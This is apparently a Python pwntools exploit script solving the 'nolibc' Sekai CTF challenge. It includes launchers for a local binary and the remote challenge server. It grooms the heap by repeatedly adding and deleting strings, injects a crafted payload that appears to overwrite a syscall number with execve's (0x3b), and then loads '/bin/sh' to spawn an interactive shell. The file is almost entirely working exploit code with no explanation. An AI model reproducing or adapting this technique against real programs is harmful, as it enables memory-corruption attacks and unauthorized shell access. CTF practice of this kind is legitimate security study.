from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64

file = "./nolibc"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("nolibc.chals.sekai.team", 1337, ssl=True)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

prefix = b"option: "

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
choice = lambda a: snum(prefix, a)

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()
    # if l == launch_remote:
        # leak = recvu(b"===================")
        # pow = getb(leak, b") solve ", b"\n").decode()
        # proc = subprocess.Popen(["python3", "pow.py", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        # pow = proc.communicate()[0]
        # sla(b"Solution? ", pow)

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

#
# exploit goes here
#
with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    # libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def login(username, password):
        choice(1)
        sla(b"Username: ", username)
        sla(b"Password: ", password)
    def register(username, password):
        choice(2)
        sla(b"Username: ", username)
        sla(b"Password: ", password)
    
    def add_str(size, string):
        choice(1)
        snum(b"length: ", size)
        sla(b"string: ", string)
    def del_str(index):
        choice(2)
        a = io.recvuntil(b"No strings to delete", timeout=0.05)
        if a != b"":
            return
        snum(b"delete: ", index)
    def view_str():
        choice(3)
    def save_file(file):
        choice(4)
        sla(b"filename: ", file)   
    def load_file(file):
        choice(5)
        sla(b"filename: ", file)
        
    def rand_str(size):
        return "".join([rnd.choice("\0A") for _ in range(size)]).encode("iso-8859-1")

    register(b"a", b"a")
    login(b"a", b"a")
    

    for _ in range(0xc000//0x120):
        print(_)
        add_str(0x100, b"")

    add_str(0x3f, b"A"*0x30 + p32(0) + p32(1) + p32(0x3b) + b"\x03")

    for _ in range(0xc000//0x120):
        print(_)
        del_str(0)

    load_file(b"/bin/sh")

    io.interactive()
    raise EOFError
    input("end")
    exit()

launch()
exploit()

# while True:
#     count = 0
#     tries += 1
#     tries_prog.status(str(tries))
#     launch()
#     try:
#         exploit()
#     except EOFError:
#         pass
#     try:
#         io.communicate()
#     except:
#         pass
#     with context.local(log_level=logging.ERROR):
#         io.close()
#     # sleep(0.05)